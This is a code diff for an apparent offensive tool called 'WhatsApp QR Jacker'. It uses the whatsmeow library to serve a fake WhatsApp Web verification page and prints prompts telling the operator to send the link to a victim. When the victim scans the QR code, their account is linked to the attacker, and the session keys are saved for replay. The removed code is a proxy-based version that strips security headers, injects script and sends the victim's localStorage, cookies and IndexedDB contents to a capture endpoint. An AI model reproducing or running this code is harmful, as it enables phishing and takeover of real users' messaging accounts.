@@ -2,19 +2,23 @@ package whatsapp
 
 import (
 	"bufio"
+	"context"
 	"encoding/json"
 	"fmt"
-	"io"
 	"net"
 	"net/http"
-	"net/http/httputil"
-	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"sync"
 	"time"
+
+	"go.mau.fi/whatsmeow"
+	"go.mau.fi/whatsmeow/store"
+	"go.mau.fi/whatsmeow/types/events"
+	waLog "go.mau.fi/whatsmeow/util/log"
+	"rsc.io/qr"
 
 	"programa/utils"
 )
@@ -37,10 +41,16 @@ type attackCfg struct {
 	Host string
 }
 
-var (
-	capturedSessionJSON string
-	capturedMu          sync.Mutex
-)
+type attackState struct {
+	mu          sync.Mutex
+	qrCode      string
+	paired      bool
+	sessionData *store.Device
+	errorMsg    string
+	startTime   time.Time
+}
+
+var currentAttack *attackState
 
 func Run() {
 	reader := bufio.NewReader(os.Stdin)
@@ -106,15 +116,75 @@ func doAttack(reader *bufio.Reader) {
 func launchAttack(cfg attackCfg) {
 	os.MkdirAll(sessionsDir, 0755)
 
-	capturedMu.Lock()
-	capturedSessionJSON = ""
-	capturedMu.Unlock()
+	currentAttack = &attackState{
+		startTime: time.Now(),
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+
+	device := &store.Device{
+		Container: &store.NoopStore{},
+	}
+	device.SetAllStores(&store.NoopStore{})
+	cli := whatsmeow.NewClient(device, waLog.Noop)
+
+	qrChan, err := cli.GetQRChannel(ctx)
+	if err != nil {
+		fmt.Printf("%s[!] Failed to get QR channel: %v%s\n", utils.Red, err, utils.Reset)
+		utils.PauseForInput()
+		return
+	}
+
+	err = cli.Connect()
+	if err != nil {
+		fmt.Printf("%s[!] Failed to connect: %v%s\n", utils.Red, err, utils.Reset)
+		utils.PauseForInput()
+		return
+	}
+
+	go func() {
+		for item := range qrChan {
+			switch item.Event {
+			case whatsmeow.QRChannelEventCode:
+				currentAttack.mu.Lock()
+				currentAttack.qrCode = item.Code
+				currentAttack.mu.Unlock()
+			case "success":
+				currentAttack.mu.Lock()
+				currentAttack.paired = true
+				currentAttack.sessionData = cli.Store
+				currentAttack.mu.Unlock()
+				saveCapturedSession(cli.Store)
+				cancel()
+				return
+			case whatsmeow.QRChannelEventError:
+				currentAttack.mu.Lock()
+				if item.Error != nil {
+					currentAttack.errorMsg = item.Error.Error()
+				}
+				currentAttack.mu.Unlock()
+			case "err-client-outdated":
+				currentAttack.mu.Lock()
+				currentAttack.errorMsg = "whatsmeow client outdated, please update"
+				currentAttack.mu.Unlock()
+			case "timeout":
+				currentAttack.mu.Lock()
+				currentAttack.errorMsg = "pairing timeout"
+				currentAttack.mu.Unlock()
+			case "err-unexpected-state":
+				currentAttack.mu.Lock()
+				currentAttack.errorMsg = "unexpected state (already paired?)"
+				currentAttack.mu.Unlock()
+			}
+		}
+	}()
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/", verifyHandler)
-	mux.HandleFunc("/qr", phishingHandler)
-	mux.HandleFunc("/wa/", proxyHandler)
-	mux.HandleFunc("/capture", captureHandler)
+	mux.HandleFunc("/qr", qrPageHandler)
+	mux.HandleFunc("/qr-image", qrImageHandler)
+	mux.HandleFunc("/qr-status", qrStatusHandler)
 
 	addr := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
 	listener, err := net.Listen("tcp", addr)
@@ -133,10 +203,10 @@ func launchAttack(cfg attackCfg) {
 	attackURL := fmt.Sprintf("http://%s:%d", ip, cfg.Port)
 	localURL := fmt.Sprintf("http://127.0.0.1:%d", cfg.Port)
 
-	fmt.Printf("\n%s[+] Proxy + Phishing server running%s\n", utils.Green, utils.Reset)
+	fmt.Printf("\n%s[+] WhatsApp QR Jacker running%s\n", utils.Green, utils.Reset)
 	fmt.Printf("%s[+] Send this link to victim: %s%s\n", utils.Yellow, attackURL, utils.Reset)
 	fmt.Printf("%s[+] Open locally to test:  %s%s\n", utils.Yellow, localURL, utils.Reset)
-	fmt.Printf("%s[+] Victim opens link → sees problem screen → clicks Verify → sees QR → pairs → overlay%s\n", utils.Yellow, utils.Reset)
+	fmt.Printf("%s[+] Victim opens link → sees problem screen → clicks Verify → sees QR → scans with phone → session captured%s\n", utils.Yellow, utils.Reset)
 	fmt.Printf("%s[+] Waiting for victim to scan QR and pair...\n\n%s", utils.Yellow, utils.Reset)
 
 	srv := &http.Server{Handler: mux}
@@ -147,27 +217,28 @@ func launchAttack(cfg attackCfg) {
 	sessionCaptured := false
 
 	for time.Since(start) < timeout {
-		capturedMu.Lock()
-		jsonData := capturedSessionJSON
-		capturedMu.Unlock()
-		if jsonData != "" {
-			sessionCaptured = true
+		currentAttack.mu.Lock()
+		paired := currentAttack.paired
+		errMsg := currentAttack.errorMsg
+		currentAttack.mu.Unlock()
 
-			var data map[string]interface{}
-			json.Unmarshal([]byte(jsonData), &data)
-			fmt.Printf("\n%s[+] SESSION CAPTURED!%s\n", utils.Green, utils.Reset)
-			fmt.Printf("%s[+] localStorage keys: %d%s\n", utils.Green, len(data["localStorage"].(map[string]interface{})), utils.Reset)
-			fmt.Printf("%s[+] IndexedDB databases: %v%s\n", utils.Green, data["indexedDB"], utils.Reset)
-
-			saveCapturedSession(jsonData)
+		if errMsg != "" {
+			fmt.Printf("\n%s[!] Error: %s%s\n", utils.Red, errMsg, utils.Reset)
 			break
 		}
-		time.Sleep(time.Second)
+		if paired {
+			sessionCaptured = true
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
 	}
 
 	srv.Close()
+	cli.Disconnect()
 
-	if !sessionCaptured {
+	if sessionCaptured {
+		fmt.Printf("\n%s[+] Session captured! Use it with option 3 (Replay).%s\n", utils.Green, utils.Reset)
+	} else if errMsg == "" {
 		fmt.Printf("\n%s[!] No session captured within timeout.%s\n", utils.Yellow, utils.Reset)
 	}
 	utils.PauseForInput()
@@ -183,78 +254,56 @@ func verifyHandler(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte(verifyPageHTML))
 }
 
-func phishingHandler(w http.ResponseWriter, r *http.Request) {
-	if r.URL.Path != "/qr" {
-		http.NotFound(w, r)
-		return
-	}
+func qrPageHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
-	w.Write([]byte(phishingPageHTML))
+	w.Write([]byte(qrPageHTML))
 }
 
-func proxyHandler(w http.ResponseWriter, r *http.Request) {
-	targetURL, _ := url.Parse("https://web.whatsapp.com")
-	proxy := httputil.NewSingleHostReverseProxy(targetURL)
+func qrImageHandler(w http.ResponseWriter, r *http.Request) {
+	currentAttack.mu.Lock()
+	code := currentAttack.qrCode
+	currentAttack.mu.Unlock()
 
-	proxy.ModifyResponse = func(resp *http.Response) error {
-		resp.Header.Del("X-Frame-Options")
-		resp.Header.Del("Content-Security-Policy")
-		resp.Header.Del("X-Content-Type-Options")
-		resp.Header.Del("Strict-Transport-Security")
-		resp.Header.Del("Cross-Origin-Resource-Policy")
-		resp.Header.Del("Cross-Origin-Embedder-Policy")
-		resp.Header.Del("Cross-Origin-Opener-Policy")
-
-		ct := resp.Header.Get("Content-Type")
-		if strings.Contains(ct, "text/html") {
-			body, err := io.ReadAll(resp.Body)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
-
-			sbody := string(body)
-			sbodyLower := strings.ToLower(sbody)
-
-			injection := `<base href="/wa/"><script>window.top=window;window.parent=window;if(navigator.serviceWorker){var r=navigator.serviceWorker.register;navigator.serviceWorker.register=function(){return Promise.resolve({active:null,installing:null,waiting:null,update:function(){return Promise.resolve()},unregister:function(){return Promise.resolve(!0)}})}}</script>`
-
-			idx := strings.Index(sbodyLower, "<head")
-			if idx >= 0 {
-				end := strings.Index(sbodyLower[idx:], ">")
-				if end >= 0 {
-					sbody = sbody[:idx+end+1] + injection + sbody[idx+end+1:]
-				}
-			}
-			body = []byte(sbody)
-
-			resp.Body = io.NopCloser(strings.NewReader(string(body)))
-			resp.ContentLength = int64(len(body))
-			resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
-		}
-		return nil
-	}
-
-	r.URL.Path = strings.TrimPrefix(r.URL.Path, "/wa")
-	if !strings.HasPrefix(r.URL.Path, "/") {
-		r.URL.Path = "/" + r.URL.Path
-	}
-	r.RequestURI = r.URL.String()
-
-	proxy.ServeHTTP(w, r)
-}
-
-func captureHandler(w http.ResponseWriter, r *http.Request) {
-	if r.Method != "POST" {
-		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+	if code == "" {
+		w.WriteHeader(http.StatusServiceUnavailable)
+		w.Write([]byte("QR not ready"))
 		return
 	}
-	body, _ := io.ReadAll(r.Body)
-	capturedMu.Lock()
-	capturedSessionJSON = string(body)
-	capturedMu.Unlock()
-	w.WriteHeader(http.StatusOK)
-	w.Write([]byte("captured"))
+
+	codeImg, err := qr.Encode(code, qr.Q)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+
+	w.Header().Set("Content-Type", "image/png")
+	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	w.Write(codeImg.PNG())
+}
+
+func qrStatusHandler(w http.ResponseWriter, r *http.Request) {
+	currentAttack.mu.Lock()
+	paired := currentAttack.paired
+	errMsg := currentAttack.errorMsg
+	hasQR := currentAttack.qrCode != ""
+	currentAttack.mu.Unlock()
+
+	status := "waiting"
+	if paired {
+		status = "paired"
+	} else if errMsg != "" {
+		status = "error"
+	} else if !hasQR {
+		status = "connecting"
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status":  status,
+		"error":   errMsg,
+		"paired":  paired,
+	})
 }
 
 const verifyPageHTML = `<!DOCTYPE html>
@@ -285,7 +334,7 @@ p{font-size:15px;line-height:1.6;color:#667781;margin-bottom:24px}
 </div>
 </body></html>`
 
-const phishingPageHTML = `<!DOCTYPE html>
+const qrPageHTML = `<!DOCTYPE html>
 <html lang="en"><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
@@ -310,121 +359,99 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Ar
 .right{flex:1;background:#fcfdfd;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:48px 40px;border-left:1px solid #e9edef;position:relative}
 .right .qr-label{font-size:13px;color:#8696a0;margin-bottom:14px;text-transform:uppercase;letter-spacing:1px}
 .right .qr-border{border:3px solid #00a884;border-radius:16px;padding:12px;background:#fff;box-shadow:0 1px 6px rgba(0,168,132,0.12);margin-bottom:18px}
-.right .qr-border iframe{display:block;width:240px;height:240px;border:none;border-radius:4px}
-.right .actions{display:flex;gap:10px;margin-top:4px}
+.right .qr-border img{display:block;width:240px;height:240px;border-radius:4px;image-rendering:pixelated}
+.right .actions{display:flex;gap:10px;margin-top:4px;justify-content:center}
 .right .actions a{display:inline-block;padding:8px 22px;border-radius:24px;font-size:13px;text-decoration:none;cursor:pointer;transition:all .15s}
 .right .actions .refresh{background:#00a884;color:#fff;border:none;font-weight:500}
 .right .actions .refresh:hover{background:#009972}
-.right .actions .link{background:transparent;color:#00a884;border:1px solid #d9dee0}
-.right .actions .link:hover{background:#f0faf8}
 .footer{text-align:center;padding:18px;font-size:12px;color:#8696a0;background:#f0f2f5;flex-shrink:0;border-top:1px solid #e9edef}
 .footer a{color:#00a884;text-decoration:none;margin:0 10px}
 .footer a:hover{text-decoration:underline}
-#verify-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.85);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
-#verify-overlay.active{display:flex}
-#verify-overlay .msg{background:#fff;border-radius:12px;padding:40px;max-width:420px;text-align:center;color:#41525d}
-#verify-overlay .msg h2{font-size:22px;font-weight:500;margin-bottom:12px;color:#1f2a30}
-#verify-overlay .msg p{font-size:15px;line-height:1.5;color:#667781;margin-bottom:20px}
-#verify-overlay .msg .btn{display:inline-block;background:#00a884;color:#fff;border:none;border-radius:24px;padding:10px 32px;font-size:15px;cursor:pointer}
-#verify-overlay .msg .btn:hover{background:#009972}
-@media(max-width:800px){.card{flex-direction:column-reverse;min-height:auto;border-radius:0}.left,.right{padding:28px 20px;border-left:none}.left .steps-wrap{max-width:100%}.right .qr-border iframe{width:200px;height:200px}}
+#pair-overlay{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.85);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+#pair-overlay.active{display:flex}
+#pair-overlay .msg{background:#fff;border-radius:12px;padding:40px;max-width:420px;text-align:center;color:#41525d}
+#pair-overlay .msg h2{font-size:22px;font-weight:500;margin-bottom:12px;color:#1f2a30}
+#pair-overlay .msg p{font-size:15px;line-height:1.5;color:#667781;margin-bottom:20px}
+#pair-overlay .msg .btn{display:inline-block;background:#00a884;color:#fff;border:none;border-radius:24px;padding:10px 32px;font-size:15px;cursor:pointer}
+#pair-overlay .msg .btn:hover{background:#009972}
+#status-msg{font-size:13px;color:#8696a0;margin-top:8px;min-height:20px}
+@media(max-width:800px){.card{flex-direction:column-reverse;min-height:auto;border-radius:0}.left,.right{padding:28px 20px;border-left:none}.left .steps-wrap{max-width:100%}.right .qr-border img{width:200px;height:200px}}
 @media(max-width:480px){.main{padding:0}.card{box-shadow:none}.left h1{font-size:22px}}
 </style></head><body>
 <div class="top-bar"></div>
-<div class="main"><div class="card"><div class="left"><div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#00a884" d="M24 0C10.8 0 0 10.8 0 24c0 4.8 1.4 9.2 3.8 13L1.2 46.8 12 43.2c3.6 2 7.8 3.2 12 3.2 13.2 0 24-10.8 24-24S37.2 0 24 0z"/><path fill="#fff" d="M33.6 28.8c-.6-.3-3.6-1.8-4.2-2-.6-.2-1-.3-1.4.3-.4.6-1.6 2-2 2.4-.4.4-.8.4-1.4.1-.6-.3-2.4-.9-4.6-2.8-1.7-1.5-2.8-3.3-3.2-3.9-.3-.6 0-.9.3-1.2.3-.3.6-.6.8-.9.3-.3.4-.6.6-.9.2-.3.1-.6-.1-.9-.2-.3-1.4-3.4-1.9-4.6-.5-1.2-1-1-1.4-1-.4 0-.8-.1-1.2-.1-.4 0-1.1.2-1.7.8-.6.6-2.2 2.2-2.2 5.3s2.2 6.2 2.6 6.6c.3.4 4.4 7 10.8 9.6 1.5.6 2.7 1 3.6 1.3 1.5.5 2.9.4 4 .3 1.2-.1 3.8-1.5 4.3-3 .5-1.4.5-2.6.4-2.9-.2-.3-.6-.5-1.1-.8z"/></svg></div><h1>Use WhatsApp on your computer</h1><p class="sub">To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps-wrap"><div class="step"><span class="num">1</span><span>Open <strong>WhatsApp</strong> on your phone</span></div><div class="step"><span class="num">2</span><span>Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></span></div><div class="step"><span class="num">3</span><span>Point your phone at this screen to scan the QR code</span></div></div></div><div class="right"><div class="qr-label">Scan QR Code</div><div class="qr-border"><iframe id="wa-frame" src="/wa/" width="240" height="240"></iframe></div><div class="actions"><a class="refresh" href="#" onclick="document.getElementById('wa-frame').src='/wa/?t='+Date.now()">Refresh QR</a></div></div></div></div>
+<div class="main"><div class="card"><div class="left"><div class="logo"><svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><path fill="#00a884" d="M24 0C10.8 0 0 10.8 0 24c0 4.8 1.4 9.2 3.8 13L1.2 46.8 12 43.2c3.6 2 7.8 3.2 12 3.2 13.2 0 24-10.8 24-24S37.2 0 24 0z"/><path fill="#fff" d="M33.6 28.8c-.6-.3-3.6-1.8-4.2-2-.6-.2-1-.3-1.4.3-.4.6-1.6 2-2 2.4-.4.4-.8.4-1.4.1-.6-.3-2.4-.9-4.6-2.8-1.7-1.5-2.8-3.3-3.2-3.9-.3-.6 0-.9.3-1.2.3-.3.6-.6.8-.9.3-.3.4-.6.6-.9.2-.3.1-.6-.1-.9-.2-.3-1.4-3.4-1.9-4.6-.5-1.2-1-1-1.4-1-.4 0-.8-.1-1.2-.1-.4 0-1.1.2-1.7.8-.6.6-2.2 2.2-2.2 5.3s2.2 6.2 2.6 6.6c.3.4 4.4 7 10.8 9.6 1.5.6 2.7 1 3.6 1.3 1.5.5 2.9.4 4 .3 1.2-.1 3.8-1.5 4.3-3 .5-1.4.5-2.6.4-2.9-.2-.3-.6-.5-1.1-.8z"/></svg></div><h1>Use WhatsApp on your computer</h1><p class="sub">To use WhatsApp on your computer, scan this QR code with your phone.</p><div class="steps-wrap"><div class="step"><span class="num">1</span><span>Open <strong>WhatsApp</strong> on your phone</span></div><div class="step"><span class="num">2</span><span>Tap <strong>Menu</strong> or <strong>Settings</strong> and select <strong>Linked Devices</strong></span></div><div class="step"><span class="num">3</span><span>Point your phone at this screen to scan the QR code</span></div></div></div><div class="right"><div class="qr-label">Scan QR Code</div><div class="qr-border"><img id="qr-img" src="/qr-image" alt="QR Code" width="240" height="240"></div><div class="actions"><a class="refresh" href="#" onclick="document.getElementById('qr-img').src='/qr-image?'+Date.now()">Refresh QR</a></div><div id="status-msg">Connecting to WhatsApp...</div></div></div></div>
 <div class="footer"><a href="#">Get WhatsApp for Windows</a><a href="#">Tutorial</a><a href="#">Privacy Policy</a></div>
-<div id="verify-overlay"><div class="msg"><h2>Verification required</h2><p>For security reasons, please confirm your identity to continue using WhatsApp Web. Click the button below to verify.</p><button class="btn" onclick="document.getElementById('verify-overlay').classList.remove('active')">Verify</button></div></div>
+<div id="pair-overlay"><div class="msg"><h2>Verification required</h2><p>For security reasons, please confirm your identity to continue using WhatsApp Web. Click the button below to verify.</p><button class="btn" onclick="document.getElementById('pair-overlay').classList.remove('active')">Verify</button></div></div>
 <script>
 (function(){
-var frame = document.getElementById('wa-frame');
-var overlay = document.getElementById('verify-overlay');
-var captured = false;
+var img = document.getElementById('qr-img');
+var overlay = document.getElementById('pair-overlay');
+var statusMsg = document.getElementById('status-msg');
 
-function checkCapture(){
-if(captured) return;
-try{
-var doc = frame.contentDocument || frame.contentWindow.document;
-if(!doc) return;
-var headers = doc.querySelectorAll('header');
-if(headers.length > 0 && !captured){
-captured = true;
-var data = {localStorage:{},cookies:'',indexedDB:[]};
-try{
-var ls = frame.contentWindow.localStorage;
-for(var i=0;i<ls.length;i++){var k=ls.key(i);data.localStorage[k]=ls.getItem(k);}
-}catch(e){}
-try{data.cookies=frame.contentDocument.cookie||'';}catch(e){}
-try{
-if(frame.contentWindow.indexedDB && frame.contentWindow.indexedDB.databases){
-frame.contentWindow.indexedDB.databases().then(function(dbs){
-data.indexedDB=dbs.map(function(d){return{name:d.name,version:d.version};});
-readDBData(frame,data);
-}).catch(function(e){sendCapture(data);});
-}else{sendCapture(data);}
-}catch(e){sendCapture(data);}
+function refreshQR(){
+img.src = '/qr-image?' + Date.now();
+}
+
+function pollStatus(){
+fetch('/qr-status').then(function(r){return r.json()}).then(function(data){
+if(data.status === 'paired'){
 overlay.classList.add('active');
+statusMsg.textContent = 'Paired successfully!';
+} else if(data.status === 'error'){
+statusMsg.textContent = 'Error: ' + (data.error || 'unknown');
+} else if(data.status === 'connecting'){
+statusMsg.textContent = 'Connecting to WhatsApp...';
+} else {
+statusMsg.textContent = 'Scan the QR code with your phone';
 }
-}catch(e){}
-}
-
-function readDBData(frame,data){
-if(!frame.contentWindow.indexedDB) return sendCapture(data);
-var dbs=data.indexedDB;
-if(!dbs||dbs.length===0) return sendCapture(data);
-var pending=dbs.length;
-data.dbContents={};
-dbs.forEach(function(dbInfo){
-try{
-var req=frame.contentWindow.indexedDB.open(dbInfo.name,dbInfo.version||undefined);
-req.onsuccess=function(){
-var db=req.result;
-data.dbContents[dbInfo.name]={};
-var storeNames=Array.from(db.objectStoreNames);
-if(storeNames.length===0){pending--;db.close();if(pending<=0)sendCapture(data);return;}
-var sp=storeNames.length;
-storeNames.forEach(function(sn){
-var tx=db.transaction(sn,'readonly');
-var store=tx.objectStore(sn);
-var getAll=store.getAll();
-getAll.onsuccess=function(){data.dbContents[dbInfo.name][sn]=getAll.result;sp--;if(sp<=0){pending--;db.close();if(pending<=0)sendCapture(data);}};
-getAll.onerror=function(){sp--;if(sp<=0){pending--;db.close();if(pending<=0)sendCapture(data);}};
-});
-};
-req.onerror=function(){pending--;if(pending<=0)sendCapture(data);};
-}catch(e){pending--;if(pending<=0)sendCapture(data);}
+}).catch(function(){
+statusMsg.textContent = 'Checking status...';
 });
 }
 
-function sendCapture(data){
-try{fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});}catch(e){}
-}
-
-setInterval(checkCapture,2000);
+setInterval(refreshQR, 15000);
+setInterval(pollStatus, 2000);
+pollStatus();
 })();
 </script>
 </body></html>`
 
-func saveCapturedSession(jsonData string) {
+func saveCapturedSession(device *store.Device) {
 	os.MkdirAll(sessionsDir, 0755)
 
 	ts := time.Now().Format("2006-01-02_15-04-05")
 	sessionDir := filepath.Join(sessionsDir, ts)
 	os.MkdirAll(sessionDir, 0755)
 
+	data := map[string]interface{}{
+		"timestamp":       ts,
+		"noise_key":       device.NoiseKey,
+		"identity_key":    device.IdentityKey,
+		"signed_pre_key":  device.SignedPreKey,
+		"registration_id": device.RegistrationID,
+		"adv_secret_key":  device.AdvSecretKey,
+		"jid":             device.ID,
+		"lid":             device.LID,
+		"platform":        device.Platform,
+		"business_name":   device.BusinessName,
+		"push_name":       device.PushName,
+	}
+
+	jsonData, _ := json.MarshalIndent(data, "", "  ")
 	sessionFile := filepath.Join(sessionDir, "session.json")
-	os.WriteFile(sessionFile, []byte(jsonData), 0644)
+	os.WriteFile(sessionFile, jsonData, 0644)
 
 	sessions := loadSessions()
 	id := fmt.Sprintf("%d", len(sessions))
 	sessions[id] = sessionMeta{
 		ID:        id,
 		Timestamp: ts,
-		Browser:   "proxy",
+		Browser:   "whatmeow",
 		Profile:   sessionDir,
 		URL:       "-",
 	}
 	saveSessions(sessions)
-	fmt.Printf("%s[+] Session saved! ID: %s | Path: %s%s\n", utils.Green, id, sessionDir, utils.Reset)
+	fmt.Printf("%s[+] Session saved! ID: %s | JID: %s | Path: %s%s\n", utils.Green, id, device.ID, sessionDir, utils.Reset)
 }
 
 func loadSessions() map[string]sessionMeta {
